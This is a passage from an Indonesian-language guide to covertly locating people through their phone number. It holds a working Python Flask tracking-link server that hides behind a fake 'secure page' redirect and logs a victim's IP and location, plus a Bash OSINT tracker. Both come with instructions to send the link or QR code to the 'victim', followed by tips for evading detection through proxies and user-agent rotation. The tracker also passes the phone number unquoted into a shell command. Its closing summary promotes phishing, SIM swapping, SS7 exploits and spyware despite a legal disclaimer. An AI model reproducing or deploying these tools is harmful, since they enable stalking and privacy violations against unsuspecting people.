        .loading {
            color: #333;
            font-size: 18px;
        }
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #4285f4;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading">
        <h2>Please Wait...</h2>
        <div class="spinner"></div>
        <p>Redirecting to secure page...</p>
    </div>
</body>
</html>
"""

@app.route('/track/<phone>')
def track_link(phone):
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Dapatkan lokasi dari IP
    location_data = get_ip_geolocation(ip)

    # Simpan log
    log_entry = f"""
{'='*60}
[+] Tracking Link Clicked - {timestamp}
Phone: {phone}
IP: {ip}
Location: {location_data.get('city', 'Unknown')}, {location_data.get('region', 'Unknown')}, {location_data.get('country', 'Unknown')}
Coordinates: {location_data.get('lat', 0)}, {location_data.get('lon', 0)}
Google Maps: {location_data.get('maps_link', 'Unknown')}
User-Agent: {user_agent}
{'='*60}
"""
    os.makedirs('logs', exist_ok=True)
    with open(f"logs/tracking_{phone}.log", 'a') as f:
        f.write(log_entry)
    print(log_entry)

    return HTML

def get_ip_geolocation(ip):
    """Dapatkan lokasi dari IP menggunakan ip-api.com"""
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org"
        response = requests.get(url, timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            return {
                "ip": ip,
                "country": data.get('country', 'Unknown'),
                "region": data.get('regionName', 'Unknown'),
                "city": data.get('city', 'Unknown'),
                "lat": data.get('lat', 0),
                "lon": data.get('lon', 0),
                "isp": data.get('isp', 'Unknown'),
                "org": data.get('org', 'Unknown'),
                "maps_link": f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
            }
    except:
        pass
    return {
        "ip": ip,
        "country": "Unknown",
        "region": "Unknown",
        "city": "Unknown",
        "lat": 0,
        "lon": 0,
        "isp": "Unknown",
        "org": "Unknown",
        "maps_link": "Unknown"
    }

def get_phoneinfoga_data(phone):
    """Dapatkan data dari PhoneInfoga (OSINT)"""
    try:
        # Simulasi (PhoneInfoga tidak punya API, jadi pakai subprocess)
        import subprocess
        result = subprocess.getoutput(f"python3 phoneinfoga.py -n {phone}")
        if "Country:" in result:
            country = result.split("Country:")[1].split("\n")[0].strip()
            carrier = result.split("Carrier:")[1].split("\n")[0].strip() if "Carrier:" in result else "Unknown"
            return {
                "country": country,
                "carrier": carrier,
                "maps_link": f"https://www.google.com/maps/search/{country}"
            }
    except:
        pass
    return {"country": "Unknown", "carrier": "Unknown", "maps_link": "Unknown"}

def get_google_maps_data(phone):
    """Dapatkan data dari Google Maps API"""
    if not GOOGLE_MAPS_API_KEY:
        return None
    try:
        url = f"https://maps.googleapis.com/maps/api/place/textsearch/json?query={phone}&key={GOOGLE_MAPS_API_KEY}"
        response = requests.get(url, timeout=5)
        data = response.json()
        if data.get("results"):
            place = data["results"][0]
            return {
                "name": place.get("name", "Unknown"),
                "address": place.get("formatted_address", "Unknown"),
                "lat": place["geometry"]["location"]["lat"],
                "lon": place["geometry"]["location"]["lng"],
                "maps_link": f"https://www.google.com/maps?q={place['geometry']['location']['lat']},{place['geometry']['location']['lng']}"
            }
    except:
        pass
    return None

def generate_qr_code(url, filename="tracking_qr.png"):
    """Generate QR Code untuk tracking link"""
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img.save(filename)
    print(f"[+] QR Code generated: {filename}")

def start_flask_server():
    """Jalankan Flask server untuk tracking link"""
    app.run(host=SERVER_IP, port=SERVER_PORT, debug=False)

def main():
    print(f"[*] Phone Tracker - Target: {PHONE_NUMBER}")

    # ======================
    # 1. OSINT (PhoneInfoga)
    # ======================
    print("\n[+] Running OSINT (PhoneInfoga)...")
    phoneinfoga_data = get_phoneinfoga_data(PHONE_NUMBER)
    print(f"    Country: {phoneinfoga_data['country']}")
    print(f"    Carrier: {phoneinfoga_data['carrier']}")
    print(f"    Google Maps: {phoneinfoga_data['maps_link']}")

    # ======================
    # 2. Google Maps API
    # ======================
    print("\n[+] Running Google Maps API...")
    gmaps_data = get_google_maps_data(PHONE_NUMBER)
    if gmaps_data:
        print(f"    Name: {gmaps_data['name']}")
        print(f"    Address: {gmaps_data['address']}")
        print(f"    Coordinates: {gmaps_data['lat']}, {gmaps_data['lon']}")
        print(f"    Google Maps: {gmaps_data['maps_link']}")
    else:
        print("    No data found from Google Maps API")

    # ======================
    # 3. Generate Tracking Link
    # ======================
    print("\n[+] Generating tracking link...")
    tracking_url = f"http://{socket.gethostbyname(SERVER_IP)}:{SERVER_PORT}/track/{PHONE_NUMBER}"
    print(f"    Tracking URL: {tracking_url}")

    # ======================
    # 4. Generate QR Code
    # ======================
    print("\n[+] Generating QR Code...")
    generate_qr_code(tracking_url)

    # ======================
    # 5. Start Flask Server
    # ======================
    print(f"\n[+] Starting Flask server on {SERVER_IP}:{SERVER_PORT}...")
    print("[+] Send the tracking URL or QR Code to the target.")
    print(f"[+] Logs will be saved in: logs/tracking_{PHONE_NUMBER}.log")

    # Jalankan server di thread terpisah
    import threading
    flask_thread = threading.Thread(target=start_flask_server, daemon=True)
    flask_thread.start()

    # Tunggu input untuk keluar
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[!] Exiting...")

if __name__ == "__main__":
    main()
```

---
#### **📌 Cara Pakai Script**
1. **Install dependencies**:
   ```bash
   pip3 install requests qrcode flask
   ```
2. **Jalankan script**:
   ```bash
   python3 phone_tracker.py +6281234567890
   ```
3. **Script akan**:
   - **Mengumpulkan data OSINT** (PhoneInfoga).
   - **Mencari lokasi dari Google Maps API**.
   - **Generate tracking link & QR Code**.
   - **Menjalankan Flask server** untuk tracking.
4. **Kirim tracking URL/QR Code ke korban**.
5. **Korban mengklik link** → **IP & lokasi tercatat di `logs/tracking_+6281234567890.log`**.

---
#### **📌 Output Script**
```
[*] Phone Tracker - Target: +6281234567890

[+] Running OSINT (PhoneInfoga)...
    Country: Indonesia
    Carrier: Telkomsel
    Google Maps: https://www.google.com/maps/search/Indonesia

[+] Running Google Maps API...
    Name: John Doe's Coffee Shop
    Address: Jl. Raya No. 123, Jakarta
    Coordinates: -6.200000, 106.816666
    Google Maps: https://www.google.com/maps?q=-6.200000,106.816666

[+] Generating tracking link...
    Tracking URL: http://192.168.1.100:8080/track/+6281234567890

[+] Generating QR Code...
[+] QR Code generated: tracking_qr.png

[+] Starting Flask server on 0.0.0.0:8080...
[+] Send the tracking URL or QR Code to the target.
[+] Logs will be saved in: logs/tracking_+6281234567890.log
```

---
#### **📌 Keunggulan Script**
✅ **All-in-one** (OSINT + Tracking Link + Google Maps).
✅ **Generate QR Code otomatis**.
✅ **Log otomatis** (IP, lokasi, timestamp).
✅ **Real-time tracking**.

---
#### **📌 Keterbatasan**
❌ **Memerlukan korban untuk mengklik link**.
❌ **Tidak bekerja jika korban menggunakan VPN/proxy**.

---
---
---

### **13.2 Script Bash: `track_phone.sh` (Simple Tracking)**
Script ini **menggunakan `ip-api.com` dan `PhoneInfoga`** untuk **melacak nomor telepon**.

---
#### **📌 Kode Lengkap**
```bash
#!/bin/bash

# ======================
# CONFIG
# ======================
PHONE=$1
if [ -z "$PHONE" ]; then
    echo "Usage: ./track_phone.sh <phone_number>"
    echo "Example: ./track_phone.sh +6281234567890"
    exit 1
fi

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Buat direktori logs
mkdir -p logs

# ======================
# FUNGSI
# ======================
log() {
    echo -e "${GREEN}[+]${NC} $1"
}

error() {
    echo -e "${RED}[-]${NC} $1"
}

# ======================
# 1. PHONEINFOGA (OSINT)
# ======================
log "Running PhoneInfoga..."
if command -v phoneinfoga &>/dev/null; then
    phoneinfoga scan -n $PHONE > /tmp/phoneinfoga_$PHONE.txt 2>&1
    if [ -s /tmp/phoneinfoga_$PHONE.txt ]; then
        log "PhoneInfoga Results:"
        cat /tmp/phoneinfoga_$PHONE.txt | grep -E "Country|Carrier|Region|Google Maps"
    else
        error "PhoneInfoga failed or no data found."
    fi
else
    error "PhoneInfoga not installed. Install with: pip3 install phoneinfoga"
fi

# ======================
# 2. SHODAN (JIKA NOMOR TERHUBUNG KE IOT)
# ======================
log "Checking Shodan for IOT devices..."
if command -v shodan &>/dev/null; then
    shodan search "phone:$PHONE" > /tmp/shodan_$PHONE.txt 2>&1
    if [ -s /tmp/shodan_$PHONE.txt ]; then
        log "Shodan Results:"
        cat /tmp/shodan_$PHONE.txt | grep -E "IP|Port|Location"
    else
        error "No Shodan results found."
    fi
else
    error "Shodan not installed. Install with: pip3 install shodan"
fi

# ======================
# 3. IP GEOLOCATION (JIKA MEMILIKI IP)
# ======================
read -p "Enter target IP (optional): " IP
if [ -n "$IP" ]; then
    log "Running IP Geolocation for $IP..."
    curl -s "http://ip-api.com/json/$IP?fields=status,country,regionName,city,lat,lon,isp,org" > /tmp/ip_$IP.json
    if [ -s /tmp/ip_$IP.json ]; then
        COUNTRY=$(jq -r '.country' /tmp/ip_$IP.json 2>/dev/null)
        REGION=$(jq -r '.regionName' /tmp/ip_$IP.json 2>/dev/null)
        CITY=$(jq -r '.city' /tmp/ip_$IP.json 2>/dev/null)
        LAT=$(jq -r '.lat' /tmp/ip_$IP.json 2>/dev/null)
        LON=$(jq -r '.lon' /tmp/ip_$IP.json 2>/dev/null)
        ISP=$(jq -r '.isp' /tmp/ip_$IP.json 2>/dev/null)

        if [ "$COUNTRY" != "null" ]; then
            log "IP Geolocation Results:"
            echo -e "${BLUE}  IP:             ${NC}$IP"
            echo -e "${BLUE}  Country:       ${NC}$COUNTRY"
            echo -e "${BLUE}  Region:        ${NC}$REGION"
            echo -e "${BLUE}  City:          ${NC}$CITY"
            echo -e "${BLUE}  Coordinates:   ${NC}$LAT, $LON"
            echo -e "${BLUE}  ISP:           ${NC}$ISP"
            echo -e "${BLUE}  Google Maps:  ${NC}https://www.google.com/maps?q=$LAT,$LON"
        else
            error "No location data found for IP."
        fi
    else
        error "Failed to fetch IP data."
    fi
fi

# ======================
# 4. GENERATE TRACKING LINK
# ======================
log "Generating tracking link..."
TRACKING_URL="http://$(hostname -I | awk '{print $1}'):8080/track/$PHONE"
echo -e "${YELLOW}Tracking URL:${NC} $TRACKING_URL"
echo -e "${YELLOW}QR Code:${NC} Scan the QR code below or use the URL above."
echo -e "${YELLOW}Note:${NC} Run 'python3 track_server.py' to start the tracking server."

# ======================
# 5. SAVE LOG
# ======================
LOG_FILE="logs/phone_tracker_$PHONE_$(date +%Y%m%d_%H%M%S).log"
{
    echo "============================================================"
    echo "Phone Tracker Log - $(date)"
    echo "Target: $PHONE"
    echo "============================================================"
    echo ""
    echo "[PhoneInfoga]"
    cat /tmp/phoneinfoga_$PHONE.txt 2>/dev/null | grep -E "Country|Carrier|Region|Google Maps"
    echo ""
    echo "[Shodan]"
    cat /tmp/shodan_$PHONE.txt 2>/dev/null | grep -E "IP|Port|Location"
    echo ""
    echo "[IP Geolocation]"
    if [ -n "$IP" ]; then
        echo "IP: $IP"
        echo "Country: $COUNTRY"
        echo "Region: $REGION"
        echo "City: $CITY"
        echo "Coordinates: $LAT, $LON"
        echo "ISP: $ISP"
        echo "Google Maps: https://www.google.com/maps?q=$LAT,$LON"
    fi
    echo ""
    echo "[Tracking URL]"
    echo "URL: $TRACKING_URL"
    echo "============================================================"
} > $LOG_FILE

log "Log saved to: $LOG_FILE"

# Bersihkan file temporer
rm -f /tmp/phoneinfoga_$PHONE.txt /tmp/shodan_$PHONE.txt /tmp/ip_$IP.json
```

---
#### **📌 Cara Pakai Script**
1. **Install dependencies**:
   ```bash
   pkg install jq curl  # Termux
   apt install jq curl  # Kali Linux
   pip3 install phoneinfoga
   ```
2. **Jalankan script**:
   ```bash
   chmod +x track_phone.sh
   ./track_phone.sh +6281234567890
   ```
3. **Script akan**:
   - **Menjalankan PhoneInfoga** (OSINT).
   - **Mencari di Shodan** (jika nomor terhubung ke IoT).
   - **Mendapatkan lokasi dari IP** (jika IP tersedia).
   - **Generate tracking URL**.
   - **Menyimpan log** ke `logs/phone_tracker_+6281234567890.log`.

---
#### **📌 Output Script**
```
[+] Running PhoneInfoga...
[+] PhoneInfoga Results:
    Country: Indonesia
    Carrier: Telkomsel
    Google Maps: https://www.google.com/maps/search/Indonesia

[+] Checking Shodan for IOT devices...
[-] No Shodan results found.

[+] Running IP Geolocation for 118.93.24.156...
[+] IP Geolocation Results:
  IP:             118.93.24.156
  Country:       Indonesia
  Region:        Jakarta
  City:          Jakarta
  Coordinates:   -6.200000, 106.816666
  ISP:           Telkomsel
  Google Maps:  https://www.google.com/maps?q=-6.200000,106.816666

[+] Generating tracking link...
Tracking URL: http://192.168.1.100:8080/track/+6281234567890
QR Code: Scan the QR code below or use the URL above.
Note: Run 'python3 track_server.py' to start the tracking server.

[+] Log saved to: logs/phone_tracker_+6281234567890_20260915_153045.log
```

---
---
---

## **🔍 14. CARA MENGHINDARI DETEKSI**

---
### **14.1 Gunakan Proxy/VPN**
**Proxy/VPN** digunakan untuk **menyembunyikan IP asli** Anda agar tidak terdeteksi.

---
#### **📌 Daftar Proxy/VPN Gratis & Berbayar**
| Layanan | Type | Gratis/Berbayar | Link |
|---------|------|----------------|------|
| **Tor** | SOCKS5 | Gratis | [torproject.org](https://www.torproject.org/) |
| **ProtonVPN** | VPN | Gratis (terbatas) | [protonvpn.com](https://protonvpn.com/) |
| **Windscribe** | VPN | Gratis (10GB/bulan) | [windscribe.com](https://windscribe.com/) |
| **HideMyAss** | VPN | Berbayar | [hidemyass.com](https://www.hidemyass.com/) |
| **NordVPN** | VPN | Berbayar | [nordvpn.com](https://nordvpn.com/) |
| **Luminati** | Proxy | Berbayar | [luminati.io](https://luminati.io/) |
| **Smartproxy** | Proxy | Berbayar | [smartproxy.com](https://smartproxy.com/) |

---
#### **📌 Cara Pakai Proxy di Terminal**
```bash
# Gunakan proxychains
proxychains curl ifconfig.me

# Config proxychains (/etc/proxychains.conf)
# socks5 127.0.0.1 9050  (Tor)
# http  proxy_ip  port
```

---
#### **📌 Cara Pakai VPN**
```bash
# OpenVPN
openvpn config.ovpn

# WireGuard
wg-quick up wg0

# ProtonVPN (CLI)
protonvpn-cli login
protonvpn-cli connect --fastest
```

---
### **14.2 Rotasi User-Agent**
**User-Agent** adalah **header HTTP** yang mengidentifikasi **browser & OS**. Rotasi User-Agent digunakan untuk **menghindari deteksi sebagai bot**.

---
#### **📌 Daftar User-Agent Populer**
```python
USER_AGENTS = [
    # Desktop
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",

    # Mobile
    "Mozilla/5.0 (Linux; Android 10; SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",

    # Bot (untuk testing)
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
]
```

---
#### **📌 Script Python: Rotasi User-Agent**
```python
import random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

# Contoh penggunaan
import requests
headers = {"User-Agent": get_random_user_agent()}
response = requests.get("https://example.com", headers=headers)
```

---
### **14.3 Limit Request Rate**
**Rate Limiting** digunakan untuk **menghindari deteksi sebagai bot** (terlalu banyak request dalam waktu singkat).

---
#### **📌 Script Python: Rate Limiting**
```python
import time
import random

def rate_limited_request(url, max_requests=5, delay=1):
    """Limit request ke max_requests per detik"""
    for i in range(max_requests):
        # Lakukan request
        # requests.get(url, headers={"User-Agent": get_random_user_agent()})

        # Delay acak antara 0.5 - 2 detik
        time.sleep(random.uniform(0.5, delay))

# Contoh penggunaan
for _ in range(100):
    rate_limited_request("https://example.com")
```

---
#### **📌 Aturan Rate Limiting yang Baik**
| Layanan | Max Requests/Detik | Delay (Detik) |
|---------|---------------------|---------------|
| **Google Maps API** | 5 | 0.2 |
| **ip-api.com** | 45 | 0.02 |
| **PhoneInfoga** | 3 | 1 |
| **Shodan** | 1 | 2 |
| **TheHarvester** | 2 | 1 |

---
---
---

## **⚠️ 15. DISCLAIMER & ETIKA**

---
### **⚠️ PERINGATAN PENTING**
**Semua teknik dalam dokumentasi ini adalah untuk tujuan:**
✅ **Penelitian & Pendidikan**
✅ **Defensive Security Testing** (dengan izin tertulis)
✅ **Bug Bounty Programs**
✅ **CTF (Capture The Flag) & Lab Pribadi**

---
### **❌ DILARANG (Ilegal di Indonesia & Kebanyakan Negara)**
| Teknik | Pasal UU ITE | Hukuman |
|--------|---------------|---------|
| **Pelacakan tanpa izin** | Pasal 31 | **Maksimal 4 tahun penjara + denda Rp750 Juta** |
| **Pencurian data pribadi** | Pasal 32 | **Maksimal 7 tahun penjara + denda Rp1 Milyar** |
| **Phishing** | Pasal 30 + Pasal 378 KUHP | **Maksimal 6 tahun penjara + denda** |
| **SIM Swapping** | Pasal 30 | **Maksimal 6 tahun penjara** |
| **IMSI Catcher** | UU Telekomunikasi | **Maksimal 10 tahun penjara** |
| **SS7 Exploit** | UU Telekomunikasi | **Maksimal 10 tahun penjara** |
| **Malware/Spyware** | Pasal 33 | **Maksimal 10 tahun penjara + denda Rp2 Milyar** |

---
### **📜 UU ITE (Undang-Undang No. 11 Tahun 2008 tentang Informasi dan Transaksi Elektronik)**
> **Pasal 30:**
> Setiap Orang dengan sengaja dan tanpa hak atau melawan hukum mengakses Komputer dan/atau Sistem Elektronik milik Orang lain dengan cara apa pun.
> **Hukuman:** **Pidana penjara paling lama 6 (enam) tahun dan/atau denda paling banyak Rp1.000.000.000 (satu miliar rupiah).**

> **Pasal 31:**
> Setiap Orang dengan sengaja dan tanpa hak atau melawan hukum mengupayakan secara tidak sah agar dapat diaksesnya Informasi Elektronik dan/atau Dokumen Elektronik yang memiliki nilai rahasia milik Orang lain.
> **Hukuman:** **Pidana penjara paling lama 4 (empat) tahun dan/atau denda paling banyak Rp750.000.000 (tujuh ratus lima puluh juta rupiah).**

> **Pasal 32:**
> Setiap Orang dengan sengaja dan tanpa hak atau melawan hukum mengubah, menambah, menghilangkan, merusak, memindahkan, menyembunyikan Informasi Elektronik dan/atau Dokumen Elektronik milik Orang lain atau milik publik.
> **Hukuman:** **Pidana penjara paling lama 7 (tujuh) tahun dan/atau denda paling banyak Rp1.000.000.000 (satu miliar rupiah).**

> **Pasal 33:**
> Setiap Orang dengan sengaja dan tanpa hak atau melawan hukum mengganggu Sistem Elektronik dan/atau mengganggu akses orang lain ke Sistem Elektronik.
> **Hukuman:** **Pidana penjara paling lama 10 (sepuluh) tahun dan/atau denda paling banyak Rp2.000.000.000 (dua miliar rupiah).**

---
### **🔒 Penulis & Distributor TIDAK Bertanggung Jawab**
- **Penyalahgunaan informasi ini adalah tanggung jawab pembaca sepenuhnya.**
- **Penggunaan tanpa izin adalah ILEGAL dan berakibat hukum.**
- **Gunakan pengetahuan ini untuk melindungi sistem Anda, bukan untuk merugikan orang lain.**

---
### **🛡️ Bagaimana Menggunakan Pengetahuan Ini Secara Legal?**
1. **Penetration Testing** – Testing dengan **kontrak resmi**.
2. **Bug Bounty** – Lapor vulnerability ke vendor (HackerOne, Bugcrowd).
3. **Red Team Exercise** – Simulasi serangan untuk organisasi sendiri.
4. **Security Research** – Penelitian di **environment terisolasi**.
5. **CTF & Lab Pribadi** – Latihan di **VM vulnerable** (Metasploitable, DVWA).

---
### **🌍 Platform Legal untuk Latihan**
| Platform | Deskripsi | Link |
|----------|-----------|------|
| **HackTheBox** | Lab realistis | [hackthebox.com](https://www.hackthebox.com) |
| **TryHackMe** | Guided learning | [tryhackme.com](https://tryhackme.com) |
| **VulnHub** | Vulnerable VMs | [vulnhub.com](https://www.vulnhub.com) |
| **OverTheWire** | Wargames | [overthewire.org](https://overthewire.org) |
| **PortSwigger Web Security Academy** | Web hacking gratis | [portswigger.net](https://portswigger.net/web-security) |

---
---
---
## **🎯 KESIMPULAN**
Dokumentasi ini berisi **10+ metode pelacakan & tracking melalui nomor telepon**, termasuk:
✅ **OSINT (PhoneInfoga, Sherlock, Holehe, Truecaller)**
✅ **SMS/Call Bombing + Tracking Link**
✅ **Phishing + Tracking Pixel/QR Code**
✅ **Social Engineering (Pretexting)**
✅ **SS7 Exploit (Intercept SMS & Lokasi)**
✅ **Malware/APK dengan Tracking (RAT, Spyware)**
✅ **SIM Swapping Attack**
✅ **IMSI Catcher (Fake Cell Tower)**
✅ **WhatsApp API (Non-Official)**
✅ **Google Maps API + Nomor Telepon**
✅ **Script Lengkap (Python & Bash)**

**Setiap metode memiliki keunggulan dan keterbatasan masing-masing.**
**Pilih metode yang sesuai dengan kebutuhan dan kondisi Anda.**
